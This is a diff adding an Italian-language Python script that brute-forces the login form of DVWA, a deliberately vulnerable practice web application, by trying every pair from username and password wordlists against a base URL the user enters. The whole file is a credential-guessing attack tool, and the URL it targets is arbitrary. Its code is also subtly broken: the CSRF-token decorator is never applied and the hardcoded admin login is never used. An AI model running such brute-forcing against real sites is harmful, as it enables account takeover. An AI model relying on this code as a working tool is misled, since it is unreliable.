@@ -1,0 +1,115 @@
+import requests
+from bs4 import BeautifulSoup
+
+
+class SecurityLevel:
+    LOW = "basso"
+    MEDIUM = "medio"
+    HIGH = "alto"
+    IMPOSSIBLE = "impossibile"
+
+
+class CSRFManager:
+    @staticmethod
+    def set_csrf_token(func):
+        def wrapper(*args, **kwargs):
+            user_token = CSRFManager.get_token(args[0]._session, args[0].url)
+            if user_token:
+                args[0].user_token = user_token["value"]
+            return func(*args, **kwargs)
+        return wrapper
+
+    @staticmethod
+    def get_token(session, url):
+        response = session.get(url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        user_token = soup.find("input", {"name": "user_token"})
+        return user_token
+
+
+class DVWASessionProxy:
+    login_data = {
+        "username": "admin",
+        "password": "password",
+        "Login": "Login"
+    }
+
+    def __init__(self, url):
+        self._url = url
+        self._session = requests.Session()
+        self.security = SecurityLevel.HIGH
+        self.user_token = None
+
+    @property
+    def url(self):
+        return self._url
+
+
+def get_values_from_file(filename):
+    try:
+        with open(filename, 'r') as f:
+            return [line.strip() for line in f.readlines() if line.strip()]
+    except IOError:
+        print(f"Errore: Impossibile aprire il file '{filename}'")
+        return []
+
+
+def send_credentials(session, url, data):
+    try:
+        response = session.post(url, data=data)
+        if response.status_code == 200:
+            return response
+        else:
+            print(f"Errore: Codice di stato di risposta inaspettato {response.status_code}")
+            return None
+    except requests.exceptions.RequestException as e:
+        print(f"Errore: {str(e)}")
+        return None
+
+
+if __name__ == "__main__":
+    BASE_URL = input("Inserisci l'URL di base: ")
+    username_file = input("Inserisci il nome del file per gli username: ")
+    password_file = input("Inserisci il nome del file per le password: ")
+
+    usernames = get_values_from_file(username_file)
+    passwords = get_values_from_file(password_file)
+
+    if not usernames or not passwords:
+        print("Errore: Nessun username o password trovati. Controlla i file di input.")
+        exit()
+
+    found_credentials = False
+
+    for username in usernames:
+        for password in passwords:
+            s = DVWASessionProxy(BASE_URL)
+
+            bruteforce_url = f"{s.url}/vulnerabilities/brute/?username={username}&password={password}"
+
+            data = {
+                "username": username,
+                "password": password,
+                "Login": "Login",
+                "user_token": s.user_token
+            }
+
+            response = send_credentials(s._session, bruteforce_url, data)
+
+            if response is None:
+                s._session.close()
+                continue
+
+            print(" " * 40, end="\r")
+            print(f"[!] Test in corso: {username} - {password}", end="\r")
+
+            if "Username and/or password incorrect." not in response.text:
+                print("")
+                print(f"[+] Trovate credenziali valide: {username} - {password}")
+                found_credentials = True
+
+            s._session.close()
+
+    if not found_credentials:
+        print("[-] Credenziali non trovate.")
+
